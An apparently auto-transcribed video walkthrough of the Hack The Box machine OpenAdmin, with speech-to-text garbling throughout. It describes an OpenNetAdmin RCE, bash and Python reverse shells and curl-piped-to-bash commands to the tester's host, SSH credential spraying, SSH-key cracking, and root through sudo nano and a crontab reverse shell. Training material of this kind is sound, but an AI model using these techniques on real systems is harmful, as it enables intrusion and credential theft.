 what's going on YouTube the Zips I can be do an open admin from hack the box which was marked as an easy box so with the recent tradition I haven't done this box before I didn't do any preparation this will be my first run-through of the box that being said these intros are recorded after I've done everything so I know the general gist of it we're gonna start off by finding a web server we didn't run go buster against it to discover it's running open net admin which has a RCE against it we use that RCE to get run commands on the box and we'll fumble around quite a bit because of URL encoding but eventually we get a reverse shell on the box with that reverse shell we do a bunch of enumeration find out the database password has been reused as more of the user accounts login with that user and discover there's a hidden web server on the Box access that web server to run commands as a third user it's dub-dub-dub data Jimmy and then the third user being Joana and login as her to discover that she can run sudo with nano use gtfo bins and get root that way so with all that being said let's jump in as always in a store opener and maps or - SC for default scripts SV enumerate versions Oh a output all formats put in the end map directory and call it open admin and then the IP address which is ten ten ten 171 and I actually don't have the nmap directory created so I'm going to create that and then run this command and since we're doing this live I'm going to add the - V flag so we see open ports as it does find it because and map every now and then can take a while I'm also gonna do sleep 300 and then the end map again but this time do - B - to do all ports and we can do Oh a put in the end map directory call it open admin - all ports ten ten ten 171 and I guess I can kill that sleep because and that finished wickedly fast so let's go look at the results and we just have two ports open the very first one being SSH on port 22 and it's running OpenSSH 7.6 Ubuntu and we also have HTTP on port 80 and it's just running Apache so let's go take look at the website 10-10-10 171 and we just get the Apache - Ubuntu default page so I'm just gonna check like robots.txt real quick to see if that had any quick wins it doesn't look like it does so let's copy this and throw it over to dirt buster so I'll close that window go to a new one and we'll do go Buster dir for directory mode - you URL and then desk w-4 word list user share word list dirt buster then directory list - 3 medium text and I also want to see if this is like PHP so we do index dot HTML we get this page we do dot PHP it's not found we could try ASP but there's no way that's gonna be running on Linux so I don't know what extensions on the server so I'm not gonna do the - X flag to include extensions because that would just take forever so I'm just gonna call this and go Buster - root Darnell and we'll let that run we do have a slash music so let's go check that out going over to slash music and looks like we get a page we can potentially create an account or login clicking each of these links we do go to various pages so the very first thing I'm going to press ctrl you to look at the source to see if I can figure out what type of content management system this is we can try index dot PHP not found looking at any of the links it brought us to everything is on dot HTML right now but I just want to see like do I see WP admin or something that tells me what software this is running doesn't look like I see anything immediately apparent in the source this is color Lib so let's see I'm gonna open up Cherrytree and we're gonna start taking some notes so ctrl n to create a new node call it open admin and control shift and to do child node and I'm just gonna paste color web and put potential dependency slash plug in and let's just get out of the source we do have al khair a cell so we can also copy this carousel is a popper like word plus would press plug-in so let's scroll all the way down and look at the footer to see if we have anything so coal it looks like how the template is made and we don't really see too much more so close this close this let's try it logging in we get ona you are not running the latest version please download and look at this download link it's going to open net admin so it does disclose the version so we can go here and we can say open net admin that version so let's go to search boy and see if we have anything so search Boyd ona first I'm just gonna say open net admin see if that filters out some of that noise and we have 1303 oh one going back here we are running 18 one one I guess we can try this maybe it won't work maybe it will search boy - X I'm actually gonna just do Mirror X we'll just bring it up so we could see it but we can mirror it to copy it to our local directory and then we can move up in VI in case maybe it did syntax highlighting doesn't look like it does let's see so setting the module path proof concept come on and put hid in options file it looks like this is going to be a like cross-site request forgery type thing I when exploits expect you to make the HTML page so we can do this real quick but I'd much rather them just have like a Python script or something let's just cat it to make it easier to copy copy this and we can show exactly what it's doing we could manually craft this and make it a what is it called burp command but it's easier just to make the HTML page and then go to it so when do index.html set paste paste this in Python 3m HTTP server 82 run it on port 80 and if we go to localhost we now have this so I'm going to make sure my burp suite is set to intercept on if we click exploit it's going to make the page click send a response unsupported method post we don't want to go to localhost so this URL is going to be 1 7 10 10 10 171 and we can go to proxy sure I'll 10 10 10 171 ona DCM that's good and the command we're gonna get I'm just gonna do PHP NFL or we'll do echo please subscribe I hate jumping straight for like a dangerous command I always like doing it echo first because that way if PHP safe mode or something is on we can still see a code execution works going to repeater it's still going to localhost let's change this to be wait a second 10-10-10 171 please subscribe that's there I wonder if it didn't obey the whatchamacallit control shift you to you on your elenco debt it should be posting to a URL so we'll just mainly put that so we can say slash ona DCM and the host when we've send this to repeater and click here and this is now gonna go to 10 10 10 171 send this no module specified so this exploit doesn't look like it's going to work big shocker because it's not up to date I'm gonna do your search boy - you to update and we'll see if anything else comes back I'm not sure how when the last time I updated this actually is so just run that and we can also just Google for like open net admin exploits so open net admin exploit 18 1 1 and that's off exploit dB so this is looking much more possible than the other one once we update search plate it should work as search boy is just the exploit DB database but let's go look at this it's a bash script so that's good copy let's see this window will be called search boy I'll just go back to that in a little bit and we'll do V exploit dot sh paste this in and I'm actually going to put this curl through a proxy because I'm not exactly sure what that's doing and curl proxy or just scroll down till we see something we want proxy and secure negotiate now there are a lot of options that have proxy with curl tons of options well proxy user ok - X and we specify like HTTP colon ok so let's go here we can do - X HTTP one 27001 8080 so this should send it through the proxy and I always just like sending exploits and stuff through the proxy because that way I can see exactly how it works and I don't have to understand whatever the heck they did with like running a bash command or something it's just easier for me to understand this so if we do Who am I know we probably have to change the URL where's it getting URL from alright give 1 so 10 10 10 171 Who am I there we go so we can see it doing a post so let's send this to repeater click go and we get a bunch of junk let's see echo begin end so if I search this before begin don't get anything for the request nothing weird ID first name echo test is expecting PHP let's go look at this while true oh we find /o na so if I go back here what is this yeah if I will pay attention this is the Apache to default page so over here I was specifying the full directory so let's just do post to slash ona okay if we search for begin and then end so all this command is doing now it's so much easier to understand now that I see what's going on we're doing this curl here is the payload and it's echoing begin and then it's echoing end between the command we run and the reason why it's doing that is because we're sending it to said and then we're grabbing everything between begin and end so that's essentially what is happening so we can run this put it through the proxy Oh am I bored Oh / oh na Who am I there we go so now we have this shell search boy what don't restart that I don't know why it wanted to its new Kali man okay so let's get a proper reverse shell because this is sending an HTTP request every time we try to do something which isn't really the greatest because if we try a command like su we don't have like a full TTY so let's make a shell so NCL VMP 9100 Eve bash - C then single quote bash - I dev TCP 1010 14 - I've config tun 0 I am 1010 14 - nine thousand one zero at and one let's see send that that did not work let's see and test monkey reverse shell bash - I so if you can't see that I think I did type it correctly so what I'm going to do do we have n see we do so I'm going to run NC l v NP 9001 and NC ten ten fourteen to nine thousand one so first I'm going to see if we can connect this is testing like the firewall so I know it's not the file while preventing us so it's probably this command and we have a lot of bad characters in this command so what I'm going to do is convert this to base64 so echo - n paste that we can put that in single quotes okay base64 and we can copy this echo - n paste base64 - D bash to execute and see lv MP and 9001 and it doesn't look like that worked so maybe there's a very shallow doesn't work let's just try a different one we can try this see what version of netcat is installed on the box something tells me it's not the one with the - e flag we probably also have 2/3 of - eh now NC - e I wonder if we do - H - one like that and C - H - Antoine nope I was trying to direct like standard air to standard out so been SH ten ten fourteen to five thousand one which bash do I have bash on this I do not exactly sure why that one command didn't wrk why this reverse shell doesn't quick and my VM is going awfully slow let's see ever since I started that search boy update kill go Buster I'm just gonna control see this so search poit open that admin so now we have multiple so my search plate just wasn't up to date that's why I didn't show it but now my VM is going much quicker that it killed that so let's see we can try this reverse shell and I'm going to paste it down here so we can edit it ten ten fourteen to nine thousand one pike and tight copy-paste looks good does not get a show once there's some weird iptables role on this that one normally works let's exit here go dub-dub-dub feed testify there should be a Python reverse shell curl see Python 3 - m HP server 80 curl 10 10 14 to testify okay if we direct that to bash and then we have to edit the port and IP okay let's just drawn curl 10 10 14 to desktop 5 pipe to bash that shall works but some reason that doesn't work so in my notes why can't dub-dub-dub data get a reverse shell which bash LS l a then - anyone can execute this so me I was thinking maybe I didn't have permission over bash but that's clearly not the case I'm running out of ideas I'm just gonna run this one command and then we're going to just move on ah wait let's see echoed test corrects the test so the pipe works blah gret test yeah so we don't have any bad characters that's what I was testing right there because maybe that was a bad character I wasn't actually doing that but oh we could get rid of this if I do this curl command again and just pipe it straight to Python that should work 9001 10 10 14 to testify Python nope which Python which Python 3 Perl 10 10 14 to testify Python 3 this is the script Python 3 compatible oh ok script is Python 3 compatible doesn't work so the super weird thing is oh there we go I don't know exactly what happened there but I want to go with this because I don't know maybe there's an IP tables rule that prevents Bosch from talking out that's very possible ah but then car wouldn't work I don't know but we have a shell so huzzah Python - M input PT y PT y dot spawn been - Python 3 - see my PT y PT y dot spawn been - there we go s TTY raw - echo hit F G Anna twice and now we get on this box I'm going to export term is equal to X term so now we can clear the screen and I'm gonna go to Etsy find grab IP tab I was looking for like an IP tables rule doesn't look like we have anything so let's just go back to the directory and what I did there was CD space - which is your previous working directory so let's see let's run what is it Linda Doom so CP up let's just go see deopt brewery escalation awesome sweet get pulled two up data CD Lynn peas limpy's data sage there so we can copy this - root HT be boxes open admin dub-dub-dub and then we can curl 10 10 14 - Oh Lynne pssh pipe it to bash this should finish pretty quickly looks like we Jimmy logging in on the box quite often let's just go to the top curl come on there it is so let's see we're dub-dub-dub data the kernel or is it compiled d November 12 2009 teen kernel just a note for once we pop this box to look at it I'm gonna laugh if it's just something I was doing wrong but it happens every now and then new path exported I don't know why it's saying that but it's not highlighted so I'm going to ignore it see processes on the box Apache one of those like a crontab killing my bash and that's why their shell wouldn't work but it should is still called huh look down system D timers nothing too interesting we're that's hard-coded for archive cube unto calm so they probably pulled in an old package from something we got my sequel and that's probably where I start is the my sequel because we're on a web server it's always helpful to enumerate the database we got logins root Jimmy Joanna so root Jimmy [Music] plugged into the box and we can go back to interesting capital F yep let's see oh so many set UID files on this thing but none of them look unique it highlighted both a bunch of these because like if this is the version this version that is vulnerable I think but I don't see anything that would be vulnerable to us because most of those are old dates like at with the CV of 2002 so I'm guessing that app binary is up to date let's see looks like we can capture packets potentially unexpected folders and /root slash cd-rom weird writable so we got a log file we could look at backup files backup the text that doesn't look too interesting I guess we can copy it let's see hidden files nothing they're owned by me that's writable by everyone not in home so I'm guessing since we can write that bin we can probably change something and there's open that admin if we restart the web server we could execute it maybe that's why that directory has a been but this is just highlighting bin because we can write to a directory called bin and generally that's bad see oh I saw colors okay that's the path okay don't really have that much so let's go up ona bin see what's in here touch test so we can write here but again there's no binaries so if like ona had a web server that was running out of bin and we could rewrite that web server to be malicious code and then restart the web server executes this that would be a thing but it's nothing in here so that's not a finding so let's see my sequel was the thing so let's go dot dot and look for a config find dot grep config dub dub dub config as a few config files probably config dot PHP okay let's see quite a bit in this file site configuration so I'm looking for is the my sequel information so I can probably just do slash password nope grab - I pass MySQL SQL see - are for recursive password cut - I SQL what if we can just do my SQL route does shoot route - p t oo r OT now let's see local config database settings that sounds better there we go so DB password ninja warrior' localhost so let's do mysql - you ona cyst - p ninja warrior okay we can go up here creds ona sis ninja warrior show databases can we do use users mysql I was seeing if I could access like the MySQL table to get user information not CD Oh use ona default show tables let's do describe users select ID username password from users and we got guests in admin copy paste that and let's just go to hashes org and search this looks like just md5 that looks like 32 characters so let's copy let's do hash search paste paced y KW sk d 3za we got tests and admin so this is test and this is admin so if we had went to this login and changed we could probably do admin admin and login as admin don't know what that really buys us but hey we could log into that so default creds on that don't really have anything else in the database probably that we want I'm going to Google real quick to see if maybe there's a command I missed to extract credentials I'm pretty sure it's either in a database called MySQL or users MySQL command dumb users list users show users ok yeah so we don't have permission that's the command access denied so we need the root my sequel user to do that which we don't have his creds we could try ninja warrior' with root on mysql let's see oasis root access denied so don't have that lets cat Etsy passwd and I'm going to grab everyone that has a shell of bash I'm going to do awk - capital F a field separator colon print one that was ugly I'm gonna hate myself for doing this because I always forget the command do stty - a so what you saw there was my rows and columns aren't set so Bosch didn't know how to go all the way the end so it started over writing so stty - a will print that information I can do rows 37 and 146 and then calls 146 come on tight hey I think I did this West dry I guess I've been doing these videos for a while so now you can see my thing goes all the way the end correctly but we have three users so what I'm going to do let's copy these come on we can go over here to this batch lesson v users text paste and we can copy the credential B passwords text test admin there's all the passwords we know and I'm gonna run a tool called Medusa - H oh let's see ten ten ten 171 - capital u users text - capital t passwords text and - capital m for module ssh and then the IP so this should now attempt to crack and it's gonna try all those passwords for each and we get Jimmy is that password so we can log in with that if we didn't have SSH open we could always use a program called su crack I think I have it on Kali oops yep so let's copy this - dub dub dub and if we go to dev sh m w get ten ten fourteen - as you crack chmod plus can we execute it we can so let's do V let's call it past txt put a few in and we have to grab the actual password and let's see does /su crack - aw 20 I'm just copying what's here I don't know what these are actually doing but it's in the example for how to run this program the main reason I don't like SU crack is I don't think it accepted users as a list so you'd have to run it for each user but it works like that pretty awesome if the user wasn't this if we did come on copy shoot it's screwed up my tty so all I typed there was reset to get it back so not sure exactly why this program is breaking it oh alright cuz it's doing something like that and yeah oh well it does something weird with the tty so you may have to type reset after it so if I do Jimmy and now when I type you can't see anything but if I type reset enter fixes the tty so that is a super handy command especially when you do this tty madness but let's go su Jimmy and go to the password so this should be SQL and this is I guess some local Jimmy paste the password in sound of my clipboard I guess we don't have to use s you it's probably best we don't use s you and we just SSH N and I say that because it's just going to be a like better shell when I'm SS Aging in because I don't have all this weird Python input TTY magic so I'm just gonna exit out of everything I'm just going to exit the whole pain and now if we do a PSE f you don't see that weird Python reverse shell because we exited it so now they're all on Jimmy see what he has fine dot type F - LS we have nano search history and nothing really in that so let's run the I'm just gonna look for set UID binaries I was gonna say Len peas again but the main thing I want to look for is set UID binary so / - perm I think - 4000 and then - dev null we don't want to see any error messages we need slash Devon all so these are all the set UID binaries on the Box let's see sir anything here you sign at don't really see anything and we don't have user dot text in here so I'm guessing user dot text is in Johanna but we don't have access to her yet so let's see find dot dash readable - you Jimmy that's gonna print everything readable um let's see find show files owned by user it's probably like - you let's see - group probably - user fine / - user Jimmy so I'm guessing it's going to be this right here and did we miss something Ln PT oh yeah we have this super high port 50 to 846 did I see this in my previous session I closed it let's see curl 10 10 14 - Lin pssh - so we got a high port that we probably skipped over for whatever reason mistake by me but that's probably running this web server and I thought it's a different web server because it's verdomme dub dub internal whereas the other one is opt ona so let's see we can cat Maine dot php' to see what this is and that's just going to grab Joanna's SSH key so well we have to create a session probably if this set session user name location index dot PHP so if I curl 127 0 0 1 : 5 2 8 4 6 / main dot PHP I get the key what PHP session start I was pretty sure this would not work because that maybe that knees doesn't want the exclamation point there let's see we got the key let's save this real quick and then let's play with it because I'm assuming it shouldn't have been that easy let's see H key so should be able to edit this file because we own it peach recession start I'm not exactly sure what it's doing that oh because it's not doesn't have a die so we did a semicolon here die doesn't work so what they're doing is they're just telling a browser to say put this header index dot PHP and they don't die which means the script continues and it puts information so let's see yeah so this is a 302 redirect right here right HTTP 302 found and it's telling us to go to index.php but puts the rest of the script anyways so I'm going to hit the squiggly and see to go into an SSH command mode so if we hit enter because you have to be on a new line to do that I'm going to do - capital L to do local port forward we're going to say listen on port will do 9000 - and forward to one 27001 and this port was like five four something five to eight four six five two eight four six so now if I go to localhost 9000 - we get this page so if I went to slash main dot PHP it redirects me because my browser is thinking it reads that header and redirects but again because oh it's probably configured not to do localhost but you can see it's not intercepting because the proxy is ignoring anything on localhost most likely but you can see the header right here and then the content so yeah they needed that die command because without that die it just sets the header and continues so out of curiosity I bet if it was a static username password on login right internal index OB session start come on Jimmy and that is a long password so let's see because this is 0e I think I know exactly where this is going we probably don't have to crack this hash this is Poli Kashan 512 hash at code n WCC 128 echo test sha-512 some that's I don't know what that is I bet if we looked at that source what it does with a username we'd find out let's see post password oh that is sha-512 but we just need a password that begins with zero e because PHP has a triple equal thing and it has a double equal thing with double equal it's going to be loose type comparison and PHP is going to read 0e and think that's zero to the exponent which is always going to be zero so I guess we could potentially show it PHP - a if zero is equal to zero e stuff I think this is going to be PHP echo match if zero is equal to zero II like that see so yeah so this PHP is saying matches but if we change it to triple equals it doesn't so all we need to do is find a hash collision with this which maybe we just get the hash straightaway sha-512 hash 0e magic hashes so this is probably the blogpost sha-512 come on maybe not sometimes I wish I just moved on and didn't try to show everything let's see I don't see sha-512 here we can just try this but I don't think this will work let go - and sha-512 now so we can try echo what was it command hash and then password - and the password is this yeah that's not it and I forgot to terminate a quote somewhere and I have no clue what I just did there so go up ah let's see echo shell 512 there we go and I guess my clipboard we're screwed up and I just didn't notice let's go you could hear that I'm just taking my watch off because it keeps vibrating and has distracted me and now that I took my watch off my friend's vibrating and distracting me so I just do that behind me oh let's see nothing there I guess we can just try going to what it said it was if we grab this and we can try one of the sites ed knew the hash to this so md5 hashing hash got looks like there was a leak right here people posting potentially the solution would be my guess if they have this hash saw 512 here we go I know this is a horrible website revealed got it oh man so let's see we go localhost username is it probably jimmy and revealed and then we get this page which is the hash says don't forget your ninja password and again you didn't need to do all this because they forgot that one died command but hey we do it the right way and let's see we can probably write index and just to prove this whole revealed thing we're going to yeah I don't care if I break the challenge because it's on my private lab I'm deleting a bunch of this hash so revealed and no way should match this hash again right we gonna both agree that that's not going to match however we did new private window localhost 9000 to see is revealed it's no longer my clipboard Jimmy re ve a LED whoa maybe I'm wrong with that or I type out something Jimmy yeah I don't know why that's not working anymore so I guess you need to know the password and that was just a big rabbit hole I wish now I saved that hash one if it's just one thing I actually am it's breaking my understanding of how that whole vulnerability works but we didn't kill too much time on it when comparing hashes you should always use a triple equals but maybe it's because this is now too long there is a way to get that hash back boom now we got the hash back DW paste okay so now it works but why see go back here this is actually localhost Jimmy copy the password let's just change one character this one will be a two now well again yeah so I'm not exactly sure what's going on there see put it just 0e yeah I'm not gonna spend any more time on this because obviously it's not working but it was two zeros try 3 equals does this break anything if it doesn't break anything best practice is to use it does not so not sure what's going on there but that should be a thing it's just not for some reason maybe like a newer version of PHP fixed it so let's do SH - key set paste I'm really confused because when I was doing that this uh right here that go match where is it yeah like that shared it working but okay let's just move on we got that SSH key let's try using it and said don't forget your ninja password so I'm just gonna try an edge on this key sh t sh - I we're gonna try Joanna so we can exit this exit this how do we spell Joanna all right this H key Joanna at ten ten ten 171 ninja and that does not decrypt it so let's SCP this key over to my cracking rig and we're going to go into John John the Ripper and grab SSH I think it's SSH ng - John root and we call this SH key call this route open admin SSH we can John - - word list equals up word lists rock you text and route open admin sh spy just word list not plural there we go and we get the password blood at ninjas so we can exit this and put the password blood ninjas and we get in and the reason why I was knowing this was Joanna's key because if we went all the way back to verb dub dub internal looked at main dot php' it's doing shell exec on Joanna's key and I'm guessing this Apache is running as Joanna PS EF grep Joe C system D user not exactly sure why Apache can read that but now we're Joanna and we got user dot txt we do find dot and we have local share Nano so less local share Nano again that's just a directory find dot dash type F to only show files and doesn't look like anything here so find slash what was the find command history grep find - user Joanna - dev null LS should be here let's see groups okay I just saw the LXE stuff and thought may be in that group so grep - v LX CFS let's just ignore that we can probably ignore proc ah I thought I would have ignored both of those Oh misspelling and we can do slash sis now I got much less and nothing really sticks out here I'm just looking at files that Johanna owns and don't really see anything like we did with the last thing let's see find let's do find file between two times let's see - newer not nua okay so / - newer MT 2019 probably over 928 not newer Mt it's November 11 she was in nineteen hope I didn't screw that up 10 - LS - Devin all so I'm just looking at files modified between those two dates to see if there's anything interesting we can go back a few days don't see anything so let's do curl 10 10 14 to Lin pssh pipe it with a bash well that runs a long time ago I ran Lin peas here and we did miss the port if I ran like chisel from this show I could have done probably a reverse tunnel and reinforced this so I probably didn't need to get on Jimmy I could have guessed or I wouldn't have had the password but if I ran go Buster against it I would have got main and if I looked at the HTTP request I would have seen that um the 301 or 302 redirect had content at the end so you never needed to get to Jimmy you could have bypassed that step because of forgetting that one died thing as long as you noticed the what's it called the port so let's see so let this keep going use a name string okay I peas inside logs that's funny I guess I don't know what that MQ thing is but showed up see fowls are owned by me and writable by everyone Bosch histories to Devon all see set UOIT things again siege key Oh sudo user Joanna may run the following commands on open admin Nano so sudo been a no op to prove and let's see it's probably some hotkey to escape nano we could probably just do ctrl o and right to like route SSH let's try to open a file that's out file is it high right out is ctrl L so we can probably write to an SSH key but I don't want to break the SSH key follow to insert from which is ctrl R so root SSH ID RSA not found if I do root root text and read the file lag that way at C passwd we could or at sea shadow and we could steal the root thing and again all I was doing his windows key are it's gotta be a way nano escape nano execute bash shell script nano okay up nano nano my file okay saving and then executing from the prompt giving a script mission it's not it sure there's a way to do it console within nano see the x1 at f7 this talking about switching terminals anyway exit Nana don't save so what I'm going to do is we're just going to sudo nano and we're going to read from var what is it Vera spool Tron Tron tabs spool Krong Krong tabs root not found so we can do one two three four five and bash - I - - see ten ten fourteen - whoops I think way back in the video I forgot to do a quote I think that was it echo no fast - I dev tcp ten ten fourteen to nine thousand one zero and one okay right out file two verse pool Krong Krong tabs root same on a different name n CL v NP nine thousand one and we'll see if we get a oh well I just bashed inception there I didn't need that bash - I that's probably not gonna work let's copy and paste this and see if it does no yeah get rid of that bash - I and then we don't need those quotes yep I don't know what I was thinking as I was typing that I probably got sidetracked but first full krong krong tabs root and we can delete this bash - I there we go I did not save it - I wanted to spool crong crong tabs root yes different name yes overwrite okay so now on a new minute we should get this and I'd probably just missed it see I was just looking at the menu items again to see if there was a execute I'm actually surprised is not a way just to escape nano gtfo bins nano shell control our control X see what time is it we can wait 10 seconds and then try that second way 5 star 10 seconds now 1 2 6 seconds is it going to give us a show at the new minute nope but control our control X command to execute bash reset : continue yes so what's it saying control our control X command to execute reset and then Sh 1 2 0 2 2 0 hey we got a crappy shell but it is a shell so CD / root root our text cat spool crong crong tabs root not exactly sure why that didn't work IV cables - capital L and nothing on iptables I'm honestly not sure why these Bosch Revere shells are not working a tight bash here okay I'm in bash reverse shell worked let's see V let's see if I do bash - see is it gonna work connection a few so yes so honestly I am baffled why the reverse shell as dub-dub-dub data doesn't work I know there's a way to do the SU command to force a shell but I can also since I don't care about security on this box give this guy a shell instead of trying to hunt the flag okay I am dub-dub-dub data am I going crazy miss and literally worked go all the way back here where's the set for here I am listening no shell okay so I'm not going crazy that does not work for some reason it's probably within the exploit itself now that I'm thinking about it so we could see how curl is handling this so I think we're going through a proxy if we turn it up dawn awesome good repeater let's convert selection URL URL encode all characters sure waiting and we get a shell so it was definitely some type of encoding issue we had before that we had to do Python so wastes a lot of time in the beginning if we just send it over to bash like this it would have been a lot simpler so again if we exit this show restart this and run it without the encoding let's go to the proxy tab so run this don't get anything but again and code all of these characters I just hit the press control you let's try that yeah so URL encoding thing with that and that's why we couldn't get the shell using bash but the Python so there was something weird going on there but at least that mystery is solved and that will be the Box hope you guys enjoy the video take care and I will see you all next week
